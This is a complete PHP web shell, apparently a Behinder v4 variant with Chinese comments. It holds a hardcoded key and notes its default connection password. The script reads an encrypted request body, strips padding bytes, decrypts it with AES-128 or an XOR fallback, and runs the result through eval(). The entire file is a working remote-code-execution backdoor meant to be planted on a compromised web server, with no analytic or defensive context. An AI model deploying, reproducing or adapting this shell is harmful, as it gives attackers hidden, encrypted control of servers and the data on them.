<?php
@error_reporting(0);
session_start();
    $key="42b842fc69195c9d"; //该密钥为连接密码32位md5值的前16位，默认连接密码mAtrix_911
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	// v4 aes_with_magic：Base64 密文尾部有 key[0:2]%16 个随机字节
	$magicNum=hexdec(substr($key,0,2))%16;
	if(strlen($post)>$magicNum)
	{
		$post=substr($post,0,strlen($post)-$magicNum);
	}
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
